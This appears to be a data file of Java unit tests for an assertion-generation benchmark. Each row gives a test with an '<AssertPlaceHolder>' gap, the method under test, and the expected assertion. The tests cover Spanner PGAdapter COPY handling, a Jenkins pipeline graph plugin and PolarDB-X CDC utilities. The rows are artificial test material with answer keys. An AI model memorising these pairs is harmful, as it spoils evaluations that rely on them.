"Exception { Map<String, Type> tableColumns = ImmutableMap.of(""number"", Type.int64(), ""name"", Type.string()); CSVFormat format = CSVFormat.POSTGRESQL_TEXT .builder() .setHeader(tableColumns.keySet().toArray(new String[0])) .build(); SessionState sessionState = new SessionState(mock(OptionsMetadata.class)); Connection connection = mock(Connection.class); DatabaseClient databaseClient = mock(DatabaseClient.class); when(connection.getDatabaseClient()).thenReturn(databaseClient);  MutationWriter mutationWriter = new MutationWriter( sessionState, CopyTransactionMode.ImplicitNonAtomic, connection, ""numbers"", tableColumns, /* indexedColumnsCount = */ 1, Format.TEXT, format, false);  ExecutorService executor = Executors.newFixedThreadPool(2); executor.submit( () -> { mutationWriter.addCopyData(""1\tOne\n"".getBytes(StandardCharsets.UTF_8)); mutationWriter.addCopyData(""2\tTwo"".getBytes(StandardCharsets.UTF_8)); mutationWriter.addCopyData("""".getBytes(StandardCharsets.UTF_8)); mutationWriter.addCopyData(""\n3\t"".getBytes(StandardCharsets.UTF_8)); mutationWriter.addCopyData(""Three\n4\tFour\n5\t"".getBytes(StandardCharsets.UTF_8)); mutationWriter.addCopyData(""Five\n"".getBytes(StandardCharsets.UTF_8)); mutationWriter.commit(); mutationWriter.close(); return null; }); Future<StatementResult> updateCount = executor.submit(mutationWriter);  ""<AssertPlaceHolder>""; List<Mutation> expectedMutations = ImmutableList.of( Mutation.newInsertBuilder(""numbers"").set(""number"").to(1L).set(""name"").to(""One"").build(), Mutation.newInsertBuilder(""numbers"").set(""number"").to(2L).set(""name"").to(""Two"").build(), Mutation.newInsertBuilder(""numbers"") .set(""number"") .to(3L) .set(""name"") .to(""Three"") .build(), Mutation.newInsertBuilder(""numbers"") .set(""number"") .to(4L) .set(""name"") .to(""Four"") .build(), Mutation.newInsertBuilder(""numbers"") .set(""number"") .to(5L) .set(""name"") .to(""Five"") .build()); verify(databaseClient).writeWithOptions(eq(expectedMutations), any());  executor.shutdown(); }
close() throws IOException { this.payload.close(); this.closedLatch.countDown(); this.dataReceivedLatch.countDown(); }"	assertEquals(5L, updateCount.get().getUpdateCount().longValue())
"Exception { Map<String, Type> tableColumns = ImmutableMap.of(""number"", Type.int64(), ""name"", Type.string()); CSVFormat format = CSVFormat.POSTGRESQL_TEXT .builder() .setHeader(tableColumns.keySet().toArray(new String[0])) .build(); SessionState sessionState = new SessionState(mock(OptionsMetadata.class)); Connection connection = mock(Connection.class); DatabaseClient databaseClient = mock(DatabaseClient.class); when(connection.getDatabaseClient()).thenReturn(databaseClient); MutationWriter mutationWriter = new MutationWriter( sessionState, CopyTransactionMode.ImplicitAtomic, connection, ""numbers"", tableColumns, /* indexedColumnsCount = */ 1, Format.TEXT, format, false);  CountDownLatch latch = new CountDownLatch(1); Future<?> fut = executor.submit( () -> { mutationWriter.addCopyData( ""1\t""One""\n2\t""Two""\n"".getBytes(StandardCharsets.UTF_8)); mutationWriter.close(); latch.await(); mutationWriter.addCopyData( ""1\t""One""\n2\t""Two""\n"".getBytes(StandardCharsets.UTF_8)); return null; });  mutationWriter.call(); latch.countDown(); ""<AssertPlaceHolder>""; }
call() throws Exception { PipedInputStream inputStream = new PipedInputStream(payload, copySettings.getPipeBufferSize()); pipeCreatedLatch.countDown(); final CopyInParser parser = CopyInParser.create( copySettings.getSessionState(), copyFormat, csvFormat, inputStream, hasHeader); // This LinkedBlockingDeque holds a reference to all transactions that are currently active. The // max capacity of this deque is what ensures that we never have more than maxParallelism // transactions running at the same time. We could also achieve that by using a thread pool with // a fixed number of threads. The problem with that is however that Java does not have a thread // pool implementation that will block if a new task is offered and all threads are currently in // use. The only options are 'fail or add to queue'. We want to block our worker thread in this // case when the max parallel transactions has been reached, as that automatically creates back- // pressure in our entire pipeline that consists of: // Client app (psql) -> CopyData message -> CSVParser -> Transaction. LinkedBlockingDeque<ApiFuture<Void>> activeCommitFutures = new LinkedBlockingDeque<>(copySettings.getMaxParallelism()); // This list holds all transactions that we have started. We will wait on this entire list // before finishing, to ensure that all data has been written before we signal that we are done. List<ApiFuture<Void>> allCommitFutures = new ArrayList<>(); try { // Wait until we know whether we actually will receive any data. It could be that it is an // empty copy operation, and we should then end early. dataReceivedLatch.await();  Iterator<CopyRecord> iterator = parser.iterator(); List<Mutation> mutations = new ArrayList<>(); long currentBufferByteSize = 0L; // Note: iterator.hasNext() blocks if there is not enough data in the pipeline to construct a // complete record. It returns false if the stream has been closed and all records have been // returned. while (bytesReceived.get() > 0L && !rollback.get() && iterator.hasNext()) { CopyRecord record = iterator.next(); if (record.isEndRecord()) { break; } if (record.numColumns() != this.tableColumns.keySet().size()) { throw PGExceptionFactory.newPGException( String.format( ""Invalid COPY data: Row length mismatch. Expected %d values, but got %d."", this.tableColumns.keySet().size(), record.numColumns()), SQLState.DataException); }  Mutation mutation = buildMutation(record); int mutationSize = calculateSize(mutation); this.rowCount++;  if (transactionMode == CopyTransactionMode.ImplicitNonAtomic) { currentBufferByteSize = addMutationAndMaybeFlushTransaction( activeCommitFutures, allCommitFutures, mutations, mutation, currentBufferByteSize, mutationSize); } else { mutations.add(mutation); currentBufferByteSize += mutationSize; if (mutations.size() > maxAtomicBatchSize) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""Record count: "" + mutations.size() + "" has exceeded the limit: "" + maxAtomicBatchSize + "".\n\nThe number of mutations per record is equal to the number of columns in the record "" + ""plus the number of indexed columns in the record. The maximum number of mutations "" + ""in one transaction is "" + copySettings.getMaxAtomicMutationsLimit() + "".\n\nExecute `SET SPANNER.AUTOCOMMIT_DML_MODE='PARTITIONED_NON_ATOMIC'` before executing a large COPY operation "" + ""to instruct PGAdapter to automatically break large transactions into multiple smaller. "" + ""This will make the COPY operation non-atomic.\n\n""); } if (currentBufferByteSize > copySettings.getMaxAtomicCommitSize()) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""Commit size: "" + currentBufferByteSize + "" has exceeded the limit: "" + copySettings.getMaxAtomicCommitSize() + "".\n\nExecute `SET SPANNER.AUTOCOMMIT_DML_MODE='PARTITIONED_NON_ATOMIC'` before executing a large COPY operation "" + ""to instruct PGAdapter to automatically break large transactions into multiple smaller. "" + ""This will make the COPY operation non-atomic.\n\n""); } } } // end of iterator.hasNext()  // There are no more CSVRecords in the pipeline. // Write any remaining mutations in the buffer. if (!rollback.get() && !mutations.isEmpty()) { if (transactionMode == CopyTransactionMode.Explicit) { connection.write(mutations); } else { // Wait until we have received a CopyDone message before writing the remaining data to // Spanner. If we are in a non-atomic transaction, there might already be data that have // been written to Spanner. closedLatch.await(); if (commit.get()) { allCommitFutures.add(writeToSpannerAsync(activeCommitFutures, mutations)); } } } // Wait for all commits to finish. We do this even if something went wrong, as it ensures two // things: // 1. All commits that were in flight when something went wrong will finish before we return //    an error to the client application. This prevents commits still being added to the //    database after we have returned an error, which could cause confusion. // 2. This will throw the underlying exception, so we can catch and register it. ApiFutures.allAsList(allCommitFutures).get(); } catch (SpannerException e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e); throw this.exception; } } catch (ExecutionException e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e.getCause()); throw this.exception; } } catch (Exception e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e); throw this.exception; } } finally { this.executorService.shutdown(); if (!this.executorService.awaitTermination(60L, TimeUnit.SECONDS)) { logger.log(Level.WARNING, ""Timeout while waiting for MutationWriter executor to shutdown.""); } this.payload.close(); parser.close(); } return new UpdateCount(rowCount); }"	assertNull(fut.get())
"testReplaceString() { QueryPartReplacer replacer = RegexQueryPartReplacer.replace(Pattern.compile(""foo\\(\\)""), ""bar""); ""<AssertPlaceHolder>""; }
replace(String sql) { Matcher matcher = pattern.matcher(sql); if (matcher.find()) { if (replaceEntireStatement) { return Tuple.of(replacement.get(), replacementStatus); } return Tuple.of(matcher.replaceAll(replacement.get()), replacementStatus); } return Tuple.of(sql, ReplacementStatus.CONTINUE); }"	"assertEquals(""select bar"", replacer.replace(""select foo()"").x())"
"testReplaceSupplier() { for (String replacement : new String[] {""bar1"", ""bar2""}) { QueryPartReplacer replacer = RegexQueryPartReplacer.replace( Pattern.compile(""foo\\(\\)""), Suppliers.ofInstance(replacement)); ""<AssertPlaceHolder>""; } }
replace(String sql) { Matcher matcher = pattern.matcher(sql); if (matcher.find()) { if (replaceEntireStatement) { return Tuple.of(replacement.get(), replacementStatus); } return Tuple.of(matcher.replaceAll(replacement.get()), replacementStatus); } return Tuple.of(sql, ReplacementStatus.CONTINUE); }"	"assertEquals(""select "" + replacement, replacer.replace(""select foo()"").x())"
"Exception { ByteArrayOutputStream bytes = new ByteArrayOutputStream(); DataOutputStream output = new DataOutputStream(bytes); short numColumns = 3;  CopyInResponse response = new CopyInResponse(output, numColumns, (byte) DataFormat.POSTGRESQL_TEXT.getCode()); response.sendPayload();  ""<AssertPlaceHolder>""; }
sendPayload() throws IOException { this.outputStream.writeByte(this.formatCode); this.outputStream.writeShort(this.numColumns); for (int i = 0; i < this.numColumns; i++) { this.outputStream.writeShort(this.columnFormat[i]); } }"	assertArrayEquals( new byte[] { 0, // format 0, 3, // numColumns 0, 0, // format column 1 0, 0, // format column 2 0, 0, // format column 3 }, bytes.toByteArray())
"Exception { ByteArrayOutputStream bytes = new ByteArrayOutputStream(); DataOutputStream output = new DataOutputStream(bytes); short numColumns = 3;  CopyInResponse response = new CopyInResponse(output, numColumns, (byte) DataFormat.POSTGRESQL_BINARY.getCode()); response.sendPayload();  ""<AssertPlaceHolder>""; }
sendPayload() throws IOException { this.outputStream.writeByte(this.formatCode); this.outputStream.writeShort(this.numColumns); for (int i = 0; i < this.numColumns; i++) { this.outputStream.writeShort(this.columnFormat[i]); } }"	assertArrayEquals( new byte[] { 1, // format 0, 3, // numColumns 0, 1, // format column 1 0, 1, // format column 2 0, 1, // format column 3 }, bytes.toByteArray())
"Exception { WorkflowRun run = TestUtils.createAndRunJob( j, ""hello_world_scripted"", ""helloWorldScriptedPipeline.jenkinsfile"", Result.SUCCESS);  PipelineNodeGraphAdapter builder = new PipelineNodeGraphAdapter(run); String stageId = TestUtils.getNodesByDisplayName(run, ""Say Hello"").get(0).getId(); List<FlowNodeWrapper> stepNodes = builder.getStageSteps(stageId); FlowNodeWrapper echoStep = stepNodes.get(0);  PipelineConsoleViewAction consoleAction = new PipelineConsoleViewAction(run); JSONObject consoleJson = consoleAction.getConsoleOutputJson(echoStep.getId(), 1000L); ""<AssertPlaceHolder>""; }
getConsoleOutputJson(String nodeId, Long requestStartByte) throws IOException { Long startByte = 0L; long endByte = 0L; long textLength; String text = """"; AnnotatedLargeText<? extends FlowNode> logText = getLogForNode(nodeId);  if (logText != null) { textLength = logText.length(); // positive startByte if (requestStartByte > textLength) { // Avoid resource leak. logger.error(""consoleJson - user requested startByte larger than console output.""); return null; } // if startByte is negative make sure we don't try and get a byte before 0. if (requestStartByte < 0L) { logger.debug(""consoleJson - requested negative startByte '"" + requestStartByte + ""'.""); startByte = textLength + requestStartByte; if (startByte < 0L) { logger.debug(""consoleJson - requested negative startByte '"" + requestStartByte + ""' out of bounds, starting at 0.""); startByte = 0L; } } else { startByte = requestStartByte; } logger.debug(""Returning '"" + (textLength - startByte) + ""' bytes from 'getConsoleOutput'.""); text = PipelineNodeUtil.convertLogToString(logText, startByte, true); endByte = textLength; } // If has an exception, return the exception text (inc. stacktrace). if (isUnhandledException(nodeId)) { // Set logText to exception text. This is a little hacky - maybe it would be better update the // frontend to handle steps and exceptions differently? String nodeExceptionText = getNodeExceptionText(nodeId); if (nodeExceptionText != null) { text += nodeExceptionText; } endByte += text.length(); } HashMap<String, Object> response = new HashMap<>(); response.put(""text"", text); response.put(""startByte"", startByte); response.put(""endByte"", endByte); return JSONObject.fromObject(response); }"	assertThat(consoleJson, is(nullValue()))
"Exception { WorkflowRun run = TestUtils.createAndRunJob(j, ""unstableSmokes"", ""unstableSmokes.jenkinsfile"", Result.FAILURE); PipelineGraphApi api = new PipelineGraphApi(run); PipelineGraph graph = api.createTree();  List<PipelineStage> stages = graph.getStages();  String stagesString = TestUtils.collectStagesAsString( stages, (PipelineStage stage) -> String.format( ""{%s,%s,%s,%s}"", stage.getName(), stage.getTitle(), stage.getType(), stage.getState())); ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat( stagesString, equalTo(String.join( """", ""{unstable-one,unstable-one,STAGE,unstable},"", ""{success,success,STAGE,success},"", ""{unstable-two,unstable-two,STAGE,unstable},"", ""{failure,failure,STAGE,failure}"")))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob(j, ""complexSmokes"", ""complexSmokes.jenkinsfile"", Result.SUCCESS); PipelineGraphApi api = new PipelineGraphApi(run); PipelineGraph graph = api.createTree();  List<PipelineStage> stages = graph.getStages();  String stagesString = TestUtils.collectStagesAsString(stages, PipelineStage::getName); ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat( stagesString, equalTo(String.join( """", ""Non-Parallel Stage,"", ""Parallel Stage[Branch A,Branch B,Branch C[Nested 1,Nested 2]],"", ""Skipped stage,"", ""Parallel Stage 2[Branch A,Branch B,Branch C[Nested 1,Nested 2]]"")))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob(j, ""scriptedParallel"", ""scriptedParallel.jenkinsfile"", Result.SUCCESS); PipelineGraphApi api = new PipelineGraphApi(run); PipelineGraph graph = api.createTree();  List<PipelineStage> stages = graph.getStages();  String stagesString = TestUtils.collectStagesAsString(stages, PipelineStage::getName); ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat(stagesString, equalTo(""A,Parallel[B[BA,BB],C[CA,CB]],D[E[EA,EB],F[FA,FB]],G""))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob(j, ""syntheticStages"", ""syntheticStages.jenkinsfile"", Result.SUCCESS); PipelineGraphApi api = new PipelineGraphApi(run); PipelineGraph graph = api.createTree();  List<PipelineStage> stages = graph.getStages();  String stagesString = TestUtils.collectStagesAsString( stages, (PipelineStage stage) -> String.format(""{%s,%s}"", stage.getName(), stage.isSynthetic() ? ""true"" : ""false"")); ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat( stagesString, equalTo(String.join( """", ""{Checkout SCM,true},"", ""{Stage 1,false},"", ""{Stage 2,false},"", ""{Post Actions,true}"")))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob(j, ""skippedParallel"", ""skippedParallel.jenkinsfile"", Result.SUCCESS); PipelineGraphApi api = new PipelineGraphApi(run); PipelineGraph graph = api.createTree();  List<PipelineStage> stages = graph.getStages();  String stagesString = TestUtils.collectStagesAsString( stages, (PipelineStage stage) -> String.format(""{%s,%s}"", stage.getName(), stage.getState())); ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat(stagesString, equalTo(""{Stage 1,success},{Parallel stage,skipped},{Stage 2,success}""))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob( j, ""nestedSciptedParallel"", ""nestedSciptedParallel.jenkinsfile"", Result.SUCCESS); PipelineGraphApi api = new PipelineGraphApi(run); PipelineGraph graph = api.createTree();  List<PipelineStage> stages = graph.getStages();  String stagesString = TestUtils.collectStagesAsString(stages, PipelineStage::getName); ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat(stagesString, equalTo(""Parallel[A[Build,Test[A1,A2]],B[Build,Parallel[B1,B2]]]""))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob( j, ""nestedDeclarativeParallel"", ""nestedDeclarativeParallel.jenkinsfile"", Result.SUCCESS); PipelineGraphApi api = new PipelineGraphApi(run); PipelineGraph graph = api.createTree();  List<PipelineStage> stages = graph.getStages();  String stagesString = TestUtils.collectStagesAsString(stages, PipelineStage::getName); ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat(stagesString, equalTo(""A[Build,Test[A1,A2]],B[Build,Test[B1,B2]]""))"
"Exception { QueueTaskFuture<WorkflowRun> futureRun = TestUtils.createAndRunJobNoWait(j, ""githubIssue233"", ""githubIssue233.jenkinsfile""); WorkflowRun run = futureRun.waitForStart();  SemaphoreStep.waitForStart(""wait/1"", run); List<PipelineStage> stages = new PipelineGraphApi(run).createTree().getStages();  String stagesStringRunning = TestUtils.collectStagesAsString(stages, PipelineStage::getName);  SemaphoreStep.success(""wait/1"", null); // Wait for Pipeline to end (terminating it means end nodes might not be // created). j.waitForCompletion(run);  stages = new PipelineGraphApi(run).createTree().getStages(); String stagesStringFinished = TestUtils.collectStagesAsString(stages, PipelineStage::getName); ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	assertThat(stagesStringRunning, equalTo(stagesStringFinished))
"Exception { WorkflowRun run = TestUtils.createAndRunJob( j, ""gh222_statusPropagatesToParent"", ""gh222_statusPropagatesToParent.jenkinsfile"", Result.FAILURE);  List<PipelineStage> stages = new PipelineGraphApi(run).createTree().getStages(); String stagesString = TestUtils.collectStagesAsString(stages, (PipelineStage s) -> TestUtils.nodeNameAndStatus(s));  ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat(stagesString, equalTo(""ParentStage{failure}[SubStageA{failure},SubStageB{skipped}]""))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob( j, ""pipelineWithSyntaxError"", ""pipelineWithSyntaxError.jenkinsfile"", Result.FAILURE);  List<PipelineStage> stages = new PipelineGraphApi(run).createTree().getStages(); String stagesString = TestUtils.collectStagesAsString(stages, (PipelineStage s) -> TestUtils.nodeNameAndStatus(s));  ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat(stagesString, equalTo(""Unhandled Exception{failure}""))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob( j, ""gh_358_parallelStagesMarkedAsSkipped"", ""gh_358_parallelStagesMarkedAsSkipped.jenkinsfile"", Result.FAILURE);  List<PipelineStage> stages = new PipelineGraphApi(run).createTree().getStages(); String stagesString = TestUtils.collectStagesAsString(stages, (PipelineStage s) -> TestUtils.nodeNameAndStatus(s));  ""<AssertPlaceHolder>""; }
createTree() { return createTree(new PipelineNodeGraphAdapter(run)); }"	"assertThat( stagesString, equalTo( ""foo{success},first-parallel{failure}[bar{skipped},baz{failure}],second-parallel{skipped},Post Actions{success}""))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob( j, ""hello_world_scripted"", ""helloWorldScriptedPipeline.jenkinsfile"", Result.SUCCESS);  PipelineNodeGraphAdapter builder = new PipelineNodeGraphAdapter(run); String stageId = TestUtils.getNodesByDisplayName(run, ""Say Hello"").get(0).getId(); List<FlowNodeWrapper> stepNodes = builder.getStageSteps(stageId); FlowNodeWrapper echoStep = stepNodes.get(0); AnnotatedLargeText<? extends FlowNode> logText = PipelineNodeUtil.getLogText(echoStep.getNode()); String logString = PipelineNodeUtil.convertLogToString(logText); ""<AssertPlaceHolder>""; }
convertLogToString(AnnotatedLargeText<? extends FlowNode> log) throws IOException { return convertLogToString(log, 0L, false); }"	"assertThat(logString, equalTo(""Hello, World!"" + System.lineSeparator()))"
"Exception { WorkflowRun run = TestUtils.createAndRunJob(j, ""simple_error"", ""simpleError.jenkinsfile"", Result.FAILURE); PipelineNodeGraphAdapter builder = new PipelineNodeGraphAdapter(run); String stageId = TestUtils.getNodesByDisplayName(run, ""A"").get(0).getId(); List<FlowNodeWrapper> stepNodes = builder.getStageSteps(stageId); FlowNodeWrapper errorStep = stepNodes.get(0); ""<AssertPlaceHolder>""; }
getExceptionText(@Nullable FlowNode node) { if (node != null) { String log = null; ErrorAction error = node.getAction(ErrorAction.class); if (error != null) { Throwable exception = error.getError(); if (PipelineNodeUtil.isJenkinsFailureException(exception)) { // If this is a Jenkins exception to mark a build failure then only return the // mesage - // the stack trace is unimportant as the message will be attached to the step. log = exception.getMessage(); } else { // If this is not a Jenkins failure exception, then we should print everything. log = ""Found unhandled "" + exception.getClass().getName() + "" exception:\n""; String message = exception.getMessage(); if (message != null) { log += message + ""\n\t""; } log += Arrays.stream(exception.getStackTrace()) .map(s -> s.toString()) .collect(Collectors.joining(""\n\t"")); } } return log; } return null; }"	"assertThat(PipelineNodeUtil.getExceptionText(errorStep.getNode()), equalTo(""This is an error""))"
"Exception { // It's a bit dirty, but do this in one to avoid reloading and rerunning the job (as it takes a // long time) WorkflowRun run = TestUtils.createAndRunJob( j, ""githubIssue213_callsUnknownVariable"", ""callsUnknownVariable.jenkinsfile"", Result.FAILURE);  PipelineNodeGraphAdapter builder = new PipelineNodeGraphAdapter(run); String stageId = TestUtils.getNodesByDisplayName(run, ""failure"").get(0).getId(); List<FlowNodeWrapper> stepNodes = builder.getStageSteps(stageId); FlowNodeWrapper errorStep = stepNodes.get(1); ""<AssertPlaceHolder>""; }
getExceptionText(@Nullable FlowNode node) { if (node != null) { String log = null; ErrorAction error = node.getAction(ErrorAction.class); if (error != null) { Throwable exception = error.getError(); if (PipelineNodeUtil.isJenkinsFailureException(exception)) { // If this is a Jenkins exception to mark a build failure then only return the // mesage - // the stack trace is unimportant as the message will be attached to the step. log = exception.getMessage(); } else { // If this is not a Jenkins failure exception, then we should print everything. log = ""Found unhandled "" + exception.getClass().getName() + "" exception:\n""; String message = exception.getMessage(); if (message != null) { log += message + ""\n\t""; } log += Arrays.stream(exception.getStackTrace()) .map(s -> s.toString()) .collect(Collectors.joining(""\n\t"")); } } return log; } return null; }"	"assertThat( PipelineNodeUtil.getExceptionText(errorStep.getNode()), startsWith( ""Found unhandled groovy.lang.MissingPropertyException exception:\nNo such property: undefined for class: groovy.lang.Binding""))"
"Exception { QueueTaskFuture<WorkflowRun> futureRun = TestUtils.createAndRunJobNoWait(j, ""githubIssue233"", ""githubIssue233.jenkinsfile""); WorkflowRun run = futureRun.waitForStart();  SemaphoreStep.waitForStart(""wait/1"", run); List<PipelineStep> steps = new PipelineStepApi(run).getAllSteps().getSteps();  Function<PipelineStep, String> converter = s -> s.getStageId() + ""->"" + s.getName(); String stepsStringRunning = TestUtils.collectStepsAsString(steps, converter);  SemaphoreStep.success(""wait/1"", null); // Wait for Pipeline to end (terminating it means end nodes might not be // created). j.waitForCompletion(run);  steps = new PipelineStepApi(run).getAllSteps().getSteps(); String stepsStringFinished = TestUtils.collectStepsAsString(steps, converter); String[] expected = stepsStringRunning.split("",""); String[] actual = stepsStringFinished.split("",""); for (int i = 0; i < expected.length; i++) { ""<AssertPlaceHolder>""; } }
getAllSteps() { return getAllSteps(new PipelineNodeGraphAdapter(run)); }"	assertThat(actual[i], equalTo(expected[i]))
"Exception { WorkflowRun run = TestUtils.createAndRunJob( j, ""pipelineWithSyntaxError"", ""pipelineWithSyntaxError.jenkinsfile"", Result.FAILURE);  List<PipelineStep> steps = new PipelineStepApi(run).getAllSteps().getSteps(); String stepsString = TestUtils.collectStepsAsString(steps, (PipelineStep s) -> TestUtils.nodeNameAndStatus(s));  ""<AssertPlaceHolder>""; }
getAllSteps() { return getAllSteps(new PipelineNodeGraphAdapter(run)); }"	"assertThat(stepsString, equalTo(""Pipeline error{failure}""))"
"listLocalFilesTest() { List<CdcFile> localFiles = fileSystem.listLocalFiles(); List<String> actualFileList = new ArrayList<>(); for (CdcFile file : localFiles) { actualFileList.add(file.getName()); } List<String> expectFileList = new ArrayList<>(); int n = 15; for (int i = 1; i < n; i++) { expectFileList.add(binlogFilePrefix + String.format(""%06d"", i)); } boolean expectTrue = ListUtils.isEqualList(expectFileList, actualFileList); Assert.""<AssertPlaceHolder>""; }
listLocalFiles() { return localFileSystem.listFiles(); }"	assertTrue(expectTrue)
"IOException { List<String> expect = new ArrayList<>(); List<String> actual = new ArrayList<>(); int n = 11; for (int i = 1; i < n; i++) { String fileName = BinlogFileUtil.getBinlogFilePrefix(group, stream) + String.format("".%06d"", i); expect.add(fileName); File f = fileSystem.newFile(fileName); f.createNewFile(); }  // 测试后缀不匹配场景 String fileName = String.format(""%06d"", 10) + "".tmp""; File f = fileSystem.newFile(fileName); f.createNewFile(); fileName = String.format(""%05d"", 10); f = fileSystem.newFile(fileName); f.createNewFile(); // 测试前缀不匹配场景 fileName = ""random"" + String.format(""%06d"", 10); f = fileSystem.newFile(fileName); f.createNewFile();  List<CdcFile> fileList = fileSystem.listFiles(); for (CdcFile cdcFile : fileList) { actual.add(cdcFile.getName()); } boolean res = ListUtils.isEqualList(expect, actual); Assert.""<AssertPlaceHolder>""; }
listFiles() { List<CdcFile> res = new ArrayList<>();  List<File> fileList = BinlogFileUtil.listLocalBinlogFiles(fullPath, group, stream); for (File f : fileList) { CdcFile cdcFile = new CdcFile(f.getName(), this); cdcFile.setLocation(""LOCAL""); res.add(cdcFile); }  res.sort(CdcFile::compareTo); return res; }"	assertTrue(res)
"testSerialize() { List<TableMeta.FieldMeta> fieldMetas = Lists.newArrayList( new TableMeta.FieldMeta(""c1"", ""char"", true, true, ""xxx"", false, ""xxx""), new TableMeta.FieldMeta(""c2"", ""char"", true, true, ""xxx"", false, ""xxx""), new TableMeta.FieldMeta(""c3"", ""char"", true, true, ""xxx"", false, ""xxx"") );  Map<String, TableMeta.IndexMeta> indexMetaMap = Maps.newHashMap(); indexMetaMap.put(""idx1"", new TableMeta.IndexMeta(""idx1"", ""INDEX"", false)); indexMetaMap.put(""idx2"", new TableMeta.IndexMeta(""idx2"", ""INDEX"", false)); indexMetaMap.put(""idx3"", new TableMeta.IndexMeta(""idx3"", ""INDEX"", false));  TableMeta tableMeta = new TableMeta(); tableMeta.setTable(""t1""); tableMeta.setDdl(""create table t1(id bigint)""); tableMeta.setCharset(""utf8""); tableMeta.setSchema(""d1""); tableMeta.setUseImplicitPk(true); tableMeta.setFields(fieldMetas); tableMeta.setIndexes(indexMetaMap);  DefaultQueryLog defaultQueryLog = new DefaultQueryLog( ""d1"", ""create table t1"", new Timestamp(System.currentTimeMillis()), 10000000, 1, DBMSAction.CREATE, System.currentTimeMillis()); defaultQueryLog.setFirstDdl(new AtomicBoolean(true)); defaultQueryLog.setParallelSeq(23); defaultQueryLog.setOptionValue(""opt1"", 200); defaultQueryLog.setTableMeta(tableMeta);  byte[] data = SerializationUtils.serialize(defaultQueryLog); DefaultQueryLog defaultQueryLog1 = SerializationUtils.deserialize(data); Assert.""<AssertPlaceHolder>""; }
setTableMeta(TableMeta tableMeta) { this.tableMeta = tableMeta; }"	assertEquals(defaultQueryLog, defaultQueryLog1)
"testGetInstant() { MatcherAssert.""<AssertPlaceHolder>""; }
getInstant() { if (null == INSTANT) { synchronized (ColumnarMetaManager.class) { if (null == INSTANT) { INSTANT = init(); } } }  return INSTANT; }"	assertThat(ColumnarMetaManager.getInstant(), notNullValue())
"getNormalDnHostTest() { StorageInfoService service = SpringContextHolder.getObject(StorageInfoService.class); service.setMasterUrlProvider(i -> null); service.setDnHealthChecker(i -> true);  insertStorageInfo(); DnHost normalDnHost = DnHost.getNormalDnHost(""xrelease-230821142340-71dc-rdkw-dn-0""); Assert.""<AssertPlaceHolder>""; }
getNormalDnHost(String storageInstId) { StorageInfoService service = SpringContextHolder.getObject(StorageInfoService.class); StorageInfo storageInfo = service.getNormalStorageInfo(storageInstId); if (storageInfo == null) { log.error(""failed to get normal dn host, storage inst id:{}"", storageInstId); throw new PolardbxException(""cannot get storage info from metaDB!""); } return fromStorageInfo(storageInfo); }"	assertEquals(3306, normalDnHost.getPort().intValue())
"getLocalDnHostTest() { setConfig(POLARX_INST_ID, ""xrelease-230821142340-71dc-readonly"");  StorageInfoService service = SpringContextHolder.getObject(StorageInfoService.class); service.setMasterUrlProvider(i -> null); service.setDnHealthChecker(i -> true);  insertStorageInfo(); DnHost localDnHost = DnHost.getLocalDnHost(""xrelease-230821142340-71dc-rdkw-dn-1""); Assert.""<AssertPlaceHolder>""; }
getLocalDnHost(String storageMasterInstId) { StorageInfoService service = SpringContextHolder.getObject(StorageInfoService.class); String polarxInstId = DynamicApplicationConfig.getString(ConfigKeys.POLARX_INST_ID); StorageInfo storageInfo = service.getLocalStorageInfo(polarxInstId, storageMasterInstId); if (storageInfo == null) { log.error(""failed to get local dn host, storage master inst id:{}"", storageMasterInstId); throw new PolardbxException(""cannot get storage info from metaDB!""); } return fromStorageInfo(storageInfo); }"	"assertEquals(""10.20.16.107"", localDnHost.getIp())"
"testConnection_2() { Connection connection = H2Util.getH2Connection(); List<String> tables = H2Util.showTables(connection, null); Assert.""<AssertPlaceHolder>""; }
showTables(Connection conn, String dbName) { List<String> tables = new ArrayList<>();  String sql = null; if (StringUtils.isBlank(dbName)) { sql = ""show tables""; } else { sql = ""show tables from "" + dbName; } ResultSet resultSet = executeQuery(sql, conn); try { while (resultSet.next()) { String table = resultSet.getString(1); tables.add(table); } } finally { close(resultSet); }  return tables; }"	"assertTrue(tables.contains(""T1""))"
"SQLException { JdbcConnectionPool pool = H2Util.getH2JdbcConnectionPool(); List<String> tables = H2Util.showTables(pool.getConnection(), null); Assert.""<AssertPlaceHolder>""; }
showTables(Connection conn, String dbName) { List<String> tables = new ArrayList<>();  String sql = null; if (StringUtils.isBlank(dbName)) { sql = ""show tables""; } else { sql = ""show tables from "" + dbName; } ResultSet resultSet = executeQuery(sql, conn); try { while (resultSet.next()) { String table = resultSet.getString(1); tables.add(table); } } finally { close(resultSet); }  return tables; }"	"assertTrue(tables.contains(""T1""))"
